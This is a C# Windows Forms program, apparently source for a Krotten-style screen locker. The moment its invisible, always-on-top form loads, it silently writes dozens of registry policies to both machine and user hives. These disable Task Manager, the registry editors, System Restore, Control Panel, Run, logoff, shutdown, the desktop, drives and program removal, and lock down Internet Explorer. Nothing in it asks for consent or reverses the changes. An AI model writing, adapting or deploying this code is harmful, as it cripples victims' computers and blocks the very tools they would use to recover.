using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace KrottenRestrictions
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            RegistryKey rk2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\DelegateFolders\\{59031a47-3f72-44a7-89c5-5595fe6b30ee}");
            RegistryKey rk3 = Registry.LocalMachine.CreateSubKey("SYSTEM\\ControlSet001\\Services\\LanmanServer\\Parameters");
            RegistryKey rk4 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions");
            RegistryKey rk5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer");
            RegistryKey rk6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            RegistryKey rk7 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore");
            RegistryKey rk8 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Uninstall");
            rk8.SetValue("NoAddRemovePrograms", 1, RegistryValueKind.DWord);
            rk3.SetValue("DiskSpaceThreshold", 1, RegistryValueKind.DWord);
            rk4.SetValue("NoBrowserClose", 1, RegistryValueKind.DWord);
            rk4.SetValue("NoNavButtons", 1, RegistryValueKind.DWord);
            rk4.SetValue("NoSelectDownloadDir", 1, RegistryValueKind.DWord);
            rk4.SetValue("NoBrowserContextMenu", 1, RegistryValueKind.DWord);
            rk4.SetValue("NoBrowserOptions", 1, RegistryValueKind.DWord);
            rk5.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
            rk6.SetValue("Start_ShowRun", 0, RegistryValueKind.DWord);
            rk7.SetValue("DisableSR", 1, RegistryValueKind.DWord);
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            rk.SetValue("NoDispCPL", 1, RegistryValueKind.DWord);
            rk2.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            rk.SetValue("NoStartMenuPinnedList", 1, RegistryValueKind.DWord);
            rk.SetValue("NoStartMenuMFUprogramsList", 1, RegistryValueKind.DWord);
            rk.SetValue("NoStartMenuSubFolders", 1, RegistryValueKind.DWord);
            rk.SetValue("NoCommonGroups", 1, RegistryValueKind.DWord);
            rk.SetValue("NoSMMyPictures", 1, RegistryValueKind.DWord);
            rk.SetValue("NoStartMenuMyMusic", 1, RegistryValueKind.DWord);
            rk.SetValue("NoSMMyDocs", 1, RegistryValueKind.DWord);
            rk.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            rk.SetValue("NoViewOnDrive", 1, RegistryValueKind.DWord);
            rk.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
            rk.SetValue("NoDrives", 1, RegistryValueKind.DWord);
            rk.SetValue("NoRun", 1, RegistryValueKind.DWord);
            rk.SetValue("NoFind", 1, RegistryValueKind.DWord);
            rk.SetValue("NoFavoritesMenu", 1, RegistryValueKind.DWord);
            rk.SetValue("NoRecentDocsMenu", 1, RegistryValueKind.DWord);
            rk.SetValue("NoLogOff", 1, RegistryValueKind.DWord);
            rk.SetValue("NoClose", 1, RegistryValueKind.DWord);
            rk.SetValue("NoSaveSettings", 1, RegistryValueKind.DWord);
            rk.SetValue("NoUserNameInStartMenu", 1, RegistryValueKind.DWord);
            rk.SetValue("NoToolbarCustomize", 1, RegistryValueKind.DWord);
            rk.SetValue("NoThemesTab", 1, RegistryValueKind.DWord);
            rk.SetValue("NoSMHelp", 1, RegistryValueKind.DWord);
            rk.SetValue("NoPrinterTabs", 1, RegistryValueKind.DWord);
            rk.SetValue("NoPrinters", 1, RegistryValueKind.DWord);
            rk.SetValue("NoNetHood", 1, RegistryValueKind.DWord);
            rk.SetValue("NoManageMyComputerVerb", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoStartMenuPinnedList", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoStartMenuMFUprogramsList", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoStartMenuSubFolders", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoCommonGroups", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoSMMyPictures", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoStartMenuMyMusic", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoSMMyDocs", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoViewOnDrive", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoDrives", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoRun", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoFind", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoFavoritesMenu", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoRecentDocsMenu", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoLogOff", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoClose", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoSaveSettings", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoUserNameInStartMenu", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoToolbarCustomize", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoThemesTab", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoSMHelp", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoPrinterTabs", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoPrinters", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoNetHood", 1, RegistryValueKind.DWord);
            rk2.SetValue("NoManageMyComputerVerb", 1, RegistryValueKind.DWord);
            rk.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            rk2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }
    }
}
